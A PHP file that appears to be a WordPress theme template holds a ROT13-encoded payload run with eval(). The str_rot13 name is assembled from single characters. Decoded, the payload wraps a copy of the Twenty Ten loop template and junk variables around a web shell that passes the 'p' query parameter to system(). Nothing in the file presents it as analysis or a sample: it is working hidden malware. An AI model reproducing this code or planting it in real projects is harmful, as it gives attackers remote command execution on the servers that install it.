<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gur ybbc gung qvfcynlf cbfgf
 *
 * Gur ybbc qvfcynlf gur cbfgf naq gur cbfg pbagrag. Frr
 * uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/gur-ybbc/ gb haqrefgnaq vg naq
 * uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/grzcyngr-gntf/ gb haqrefgnaq
 * gur gntf hfrq va vg.
 *
 * Guvf pna or bireevqqra va puvyq gurzrf jvgu ybbc.cuc be
 * ybbc-grzcyngr.cuc, jurer 'grzcyngr' vf gur ybbc pbagrkg
 * erdhrfgrq ol n grzcyngr. Sbe rknzcyr, ybbc-vaqrk.cuc jbhyq
 * or hfrq vs vg rkvfgf naq jr nfx sbe gur ybbc jvgu:
 * <pbqr>trg_grzcyngr_cneg( 'ybbc', 'vaqrk' );</pbqr>
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gra
 * @fvapr Gjragl Gra 1.0
 */
?>

<?cuc // Qvfcynl anivtngvba gb arkg/cerivbhf cntrf jura nccyvpnoyr. ?>
<?cuc vs ( $jc_dhrel->znk_ahz_cntrf > 1 ) : ?>
	<qvi vq=\"ani-nobir\" pynff=\"anivtngvba\">
		<qvi pynff=\"ani-cerivbhf\"><?cuc arkg_cbfgf_yvax( __( '<fcna pynff=\"zrgn-ani\">&ynee;</fcna> Byqre cbfgf', 'gjraglgra' ) ); ?></qvi>
		<qvi pynff=\"ani-arkg\"><?cuc cerivbhf_cbfgf_yvax( __( 'Arjre cbfgf <fcna pynff=\"zrgn-ani\">&enee;</fcna>', 'gjraglgra' ) ); ?></qvi>
	</qvi><!-- #ani-nobir -->
<?cuc raqvs; ?>

<?cuc /* Vs gurer ner ab cbfgf gb qvfcynl, fhpu nf na rzcgl nepuvir cntr */ ?>
<?cuc vs ( ! unir_cbfgf() ) : ?>
	<qvi vq=\"cbfg-0\" pynff=\"cbfg reebe404 abg-sbhaq\">
		<u1 pynff=\"ragel-gvgyr\"><?cuc _r( 'Abg Sbhaq', 'gjraglgra' ); ?></u1>
		<qvi pynff=\"ragel-pbagrag\">
			<c><?cuc _r( 'Ncbybtvrf, ohg ab erfhygf jrer sbhaq sbe gur erdhrfgrq nepuvir. Creuncf frnepuvat jvyy uryc svaq n eryngrq cbfg.', 'gjraglgra' ); ?></c>
			<?cuc trg_frnepu_sbez(); ?>
		</qvi><!-- .ragel-pbagrag -->
	</qvi><!-- #cbfg-0 -->
<?cuc raqvs; ?>

<?cuc
	/*
	 * Fgneg gur Ybbc.
	 *
	 * Va Gjragl Gra jr hfr gur fnzr ybbc va zhygvcyr pbagrkgf.
	 * Vg vf oebxra vagb guerr znva cnegf: jura jr'er qvfcynlvat
	 * cbfgf gung ner va gur tnyyrel pngrtbel, jura jr'er qvfcynlvat
	 * cbfgf va gur nfvqrf pngrtbel, naq svanyyl nyy bgure cbfgf.
	 *
	 * Nqqvgvbanyyl, jr fbzrgvzrf purpx sbe jurgure jr ner ba na
	 * nepuvir cntr, n frnepu cntr, rgp., nyybjvat sbe fznyy qvssreraprf
	 * va gur ybbc ba rnpu grzcyngr jvgubhg npghnyyl qhcyvpngvat
	 * gur erfg bs gur ybbc gung vf funerq.
	 *
	 * Jvgubhg shegure nqb, gur ybbc:
	 */
?>
<?cuc
juvyr ( unir_cbfgf() ) :
	gur_cbfg();
	?>

	<?cuc /* Ubj gb qvfcynl cbfgf bs gur Tnyyrel sbezng. Gur tnyyrel pngrtbel vf gur byq jnl. */ ?>

	<?cuc vs ( ( shapgvba_rkvfgf( 'trg_cbfg_sbezng' ) && 'tnyyrel' === trg_cbfg_sbezng( $cbfg->VQ ) ) || va_pngrtbel( _k( 'tnyyrel', 'tnyyrel pngrtbel fyht', 'gjraglgra' ) ) ) : ?>
		<qvi vq=\"cbfg-<?cuc gur_VQ(); ?>\" <?cuc cbfg_pynff(); ?>>
			<u2 pynff=\"ragel-gvgyr\"><n uers=\"<?cuc gur_creznyvax(); ?>\" ery=\"obbxznex\"><?cuc gur_gvgyr(); ?></n></u2>

			<qvi pynff=\"ragel-zrgn\">
				<?cuc gjraglgra_cbfgrq_ba(); ?>
			</qvi><!-- .ragel-zrgn -->

			<qvi pynff=\"ragel-pbagrag\">
		<?cuc vs ( cbfg_cnffjbeq_erdhverq() ) : ?>
				<?cuc gur_pbagrag(); ?>
<?cuc ryfr : ?>
				<?cuc
					$vzntrf = gjraglgra_trg_tnyyrel_vzntrf();
				vs ( $vzntrf ) :
					$gbgny_vzntrf = pbhag( $vzntrf );
					$vzntr        = erfrg( $vzntrf );
					?>
					<qvi pynff=\"tnyyrel-guhzo\">
						<n pynff=\"fvmr-guhzoanvy\" uers=\"<?cuc gur_creznyvax(); ?>\"><?cuc rpub jc_trg_nggnpuzrag_vzntr( $vzntr, 'guhzoanvy' ); ?></n>
					</qvi><!-- .tnyyrel-guhzo -->
					<c><rz>
					<?cuc
						cevags(
							/* genafyngbef: 1: UGZY gnt nggevohgrf, 2: Vzntr pbhag. */
							_a( 'Guvf tnyyrel pbagnvaf <n %1$f>%2$f cubgb</n>.', 'Guvf tnyyrel pbagnvaf <n %1$f>%2$f cubgbf</n>.', $gbgny_vzntrf, 'gjraglgra' ),
							/* genafyngbef: %f: Cbfg gvgyr. */
							'uers=\"' . rfp_hey( trg_creznyvax() ) . '\" gvgyr=\"' . rfp_ngge( fcevags( __( 'Creznyvax gb %f', 'gjraglgra' ), gur_gvgyr_nggevohgr( 'rpub=0' ) ) ) . '\" ery=\"obbxznex\"',
							ahzore_sbezng_v18a( $gbgny_vzntrf )
						);
					?>
							</rz></c>
				<?cuc raqvs; // Raq gjraglgra_trg_tnyyrel_vzntrf() purpx. ?>
						<?cuc gur_rkprecg(); ?>
<?cuc raqvs; ?>
			</qvi><!-- .ragel-pbagrag -->

			<qvi pynff=\"ragel-hgvyvgl\">
			<?cuc
			$tnyyrel = trg_grez_ol( 'fyht', _k( 'tnyyrel', 'tnyyrel pngrtbel fyht', 'gjraglgra' ), 'pngrtbel' );
			vs ( shapgvba_rkvfgf( 'trg_cbfg_sbezng' ) && 'tnyyrel' === trg_cbfg_sbezng( $cbfg->VQ ) ) :
				?>
				<n uers=\"<?cuc rpub rfp_hey( trg_cbfg_sbezng_yvax( 'tnyyrel' ) ); ?>\" gvgyr=\"<?cuc rfp_ngge_r( 'Ivrj Tnyyrevrf', 'gjraglgra' ); ?>\"><?cuc _r( 'Zber Tnyyrevrf', 'gjraglgra' ); ?></n>
				<fcna pynff=\"zrgn-frc\">|</fcna>
			<?cuc ryfrvs ( $tnyyrel && va_pngrtbel( $tnyyrel->grez_vq ) ) : ?>
				<n uers=\"<?cuc rpub rfp_hey( trg_pngrtbel_yvax( $tnyyrel ) ); ?>\" gvgyr=\"<?cuc rfp_ngge_r( 'Ivrj cbfgf va gur Tnyyrel pngrtbel', 'gjraglgra' ); ?>\"><?cuc _r( 'Zber Tnyyrevrf', 'gjraglgra' ); ?></n>
				<fcna pynff=\"zrgn-frc\">|</fcna>
			<?cuc raqvs; ?>
				<fcna pynff=\"pbzzragf-yvax\"><?cuc pbzzragf_cbchc_yvax( __( 'Yrnir n pbzzrag', 'gjraglgra' ), __( '1 Pbzzrag', 'gjraglgra' ), __( '% Pbzzragf', 'gjraglgra' ) ); ?></fcna>
				<?cuc rqvg_cbfg_yvax( __( 'Rqvg', 'gjraglgra' ), '<fcna pynff=\"zrgn-frc\">|</fcna> <fcna pynff=\"rqvg-yvax\">', '</fcna>' ); ?>
			</qvi><!-- .ragel-hgvyvgl -->
		</qvi><!-- #cbfg-<?cuc gur_VQ(); ?> -->

		<?cuc /* Ubj gb qvfcynl cbfgf bs gur Nfvqr sbezng. Gur nfvqrf pngrtbel vf gur byq jnl. */ ?>

	<?cuc ryfrvs ( ( shapgvba_rkvfgf( 'trg_cbfg_sbezng' ) && 'nfvqr' === trg_cbfg_sbezng( $cbfg->VQ ) ) || va_pngrtbel( _k( 'nfvqrf', 'nfvqrf pngrtbel fyht', 'gjraglgra' ) ) ) : ?>
		<qvi vq=\"cbfg-<?cuc gur_VQ(); ?>\" <?cuc cbfg_pynff(); ?>>

		<?cuc vs ( vf_nepuvir() || vf_frnepu() ) : // Qvfcynl rkprecgf sbe nepuvirf naq frnepu. ?>
			<qvi pynff=\"ragel-fhzznel\">
				<?cuc gur_rkprecg(); ?>
			</qvi><!-- .ragel-fhzznel -->
		<?cuc ryfr : ?>
			<qvi pynff=\"ragel-pbagrag\">
				<?cuc gur_pbagrag( __( 'Pbagvahr ernqvat <fcna pynff=\"zrgn-ani\">&enee;</fcna>', 'gjraglgra' ) ); ?>
			</qvi><!-- .ragel-pbagrag -->
		<?cuc raqvs; ?>

			<qvi pynff=\"ragel-hgvyvgl\">
				<?cuc gjraglgra_cbfgrq_ba(); ?>
				<fcna pynff=\"zrgn-frc\">|</fcna>
				<fcna pynff=\"pbzzragf-yvax\"><?cuc pbzzragf_cbchc_yvax( __( 'Yrnir n pbzzrag', 'gjraglgra' ), __( '1 Pbzzrag', 'gjraglgra' ), __( '% Pbzzragf', 'gjraglgra' ) ); ?></fcna>
				<?cuc rqvg_cbfg_yvax( __( 'Rqvg', 'gjraglgra' ), '<fcna pynff=\"zrgn-frc\">|</fcna> <fcna pynff=\"rqvg-yvax\">', '</fcna>' ); ?>
			</qvi><!-- .ragel-hgvyvgl -->
		</qvi><!-- #cbfg-<?cuc gur_VQ(); ?> -->

		<?cuc /* Ubj gb qvfcynl nyy bgure cbfgf. */ ?>

	<?cuc ryfr : ?>
		<qvi vq=\"cbfg-<?cuc gur_VQ(); ?>\" <?cuc cbfg_pynff(); ?>>
			<u2 pynff=\"ragel-gvgyr\"><n uers=\"<?cuc gur_creznyvax(); ?>\" ery=\"obbxznex\"><?cuc gur_gvgyr(); ?></n></u2>

			<qvi pynff=\"ragel-zrgn\">
				<?cuc gjraglgra_cbfgrq_ba(); ?>
			</qvi><!-- .ragel-zrgn -->

		<?cuc vs ( vf_nepuvir() || vf_frnepu() ) : // Bayl qvfcynl rkprecgf sbe nepuvirf naq frnepu. ?>
			<qvi pynff=\"ragel-fhzznel\">
				<?cuc gur_rkprecg(); ?>
			</qvi><!-- .ragel-fhzznel -->
	<?cuc ryfr : ?>
			<qvi pynff=\"ragel-pbagrag\">
				<?cuc gur_pbagrag( __( 'Pbagvahr ernqvat <fcna pynff=\"zrgn-ani\">&enee;</fcna>', 'gjraglgra' ) ); ?>
				<?cuc
				jc_yvax_cntrf(
					neenl(
						'orsber' => '<qvi pynff=\"cntr-yvax\">' . __( 'Cntrf:', 'gjraglgra' ),
						'nsgre'  => '</qvi>',
					)
				);
				?>
			</qvi><!-- .ragel-pbagrag -->
	<?cuc raqvs; ?>

			<qvi pynff=\"ragel-hgvyvgl\">
				<?cuc vs ( pbhag( trg_gur_pngrtbel() ) ) : ?>
					<fcna pynff=\"png-yvaxf\">
						<?cuc
						/* genafyngbef: 1: PFF pynffrf, 2: Pngrtbel yvfg. */
						cevags( __( '<fcna pynff=\"%1$f\">Cbfgrq va</fcna> %2$f', 'gjraglgra' ), 'ragel-hgvyvgl-cerc ragel-hgvyvgl-cerc-png-yvaxf', trg_gur_pngrtbel_yvfg( ', ' ) );
						?>
					</fcna>
					<fcna pynff=\"zrgn-frc\">|</fcna>
				<?cuc raqvs; ?>

				<?cuc
				$gntf_yvfg = trg_gur_gnt_yvfg( '', ', ' );
				vs ( $gntf_yvfg && ! vf_jc_reebe( $gntf_yvfg ) ) :
					?>
				<fcna pynff=\"gnt-yvaxf\">
					<?cuc
					/* genafyngbef: 1: PFF pynffrf, 2: Pngrtbel yvfg. */
					cevags( __( '<fcna pynff=\"%1$f\">Gnttrq</fcna> %2$f', 'gjraglgra' ), 'ragel-hgvyvgl-cerc ragel-hgvyvgl-cerc-gnt-yvaxf', $gntf_yvfg );
					?>
				</fcna>
				<fcna pynff=\"zrgn-frc\">|</fcna>
				<?cuc raqvs; ?>

				<fcna pynff=\"pbzzragf-yvax\"><?cuc pbzzragf_cbchc_yvax( __( 'Yrnir n pbzzrag', 'gjraglgra' ), __( '1 Pbzzrag', 'gjraglgra' ), __( '% Pbzzragf', 'gjraglgra' ) ); ?></fcna>

				<?cuc rqvg_cbfg_yvax( __( 'Rqvg', 'gjraglgra' ), '<fcna pynff=\"zrgn-frc\">|</fcna> <fcna pynff=\"rqvg-yvax\">', '</fcna>' ); ?>
			</qvi><!-- .ragel-hgvyvgl -->
		</qvi><!-- #cbfg-<?cuc gur_VQ(); ?> -->

		<?cuc pbzzragf_grzcyngr( '', gehr ); ?>

	<?cuc raqvs; // Guvf jnf gur vs fgngrzrag gung oebxr gur ybbc vagb guerr cnegf onfrq ba pngrtbevrf. ?>

<?cuc raqjuvyr; // Raq bs gur ybbc. Jurj. ?>

<?cuc // Qvfcynl anivtngvba gb arkg/cerivbhf cntrf jura nccyvpnoyr. ?>
<?cuc vs ( $jc_dhrel->znk_ahz_cntrf > 1 ) : ?>
				<qvi vq=\"ani-orybj\" pynff=\"anivtngvba\">
					<qvi pynff=\"ani-cerivbhf\"><?cuc arkg_cbfgf_yvax( __( '<fcna pynff=\"zrgn-ani\">&ynee;</fcna> Byqre cbfgf', 'gjraglgra' ) ); ?></qvi>
					<qvi pynff=\"ani-arkg\"><?cuc cerivbhf_cbfgf_yvax( __( 'Arjre cbfgf <fcna pynff=\"zrgn-ani\">&enee;</fcna>', 'gjraglgra' ) ); ?></qvi>
				</qvi><!-- #ani-orybj -->
<?cuc raqvs; ?>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>